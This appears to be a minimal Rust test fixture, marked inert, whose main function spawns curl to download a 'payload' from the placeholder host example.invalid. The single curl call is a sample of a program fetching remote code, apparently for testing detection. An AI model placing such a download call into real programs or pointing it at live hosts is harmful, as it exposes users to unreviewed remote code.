// ZES test fixture (inert)
use std::process::Command;
fn main() {
    Command::new("curl").args(["-fsSL", "https://example.invalid/payload"]).status().unwrap();
}
